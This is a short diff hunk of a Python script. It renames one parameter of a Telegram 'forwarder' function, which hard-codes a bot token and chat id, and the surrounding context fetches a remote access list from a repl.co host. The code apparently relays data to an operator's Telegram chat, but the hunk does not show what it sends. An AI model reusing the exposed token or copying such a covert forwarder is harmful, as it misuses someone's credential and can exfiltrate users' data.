@@ -787,7 +787,7 @@ gxdsid = id1 + spce
 gxdsAccess = requests.get("https://arterxsk.repl.co/access.txt").text
 
 # TELEGRAM FORWARDER
-def xsndr(xs,message,chat_id):
+def xsndr(xss,message,chat_id):
     bot_token = '6404644715:AAFekBigDm7fAl3ZUhT710u8DfkF75ggTu8'
     chat_id = "6542321044"
     url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
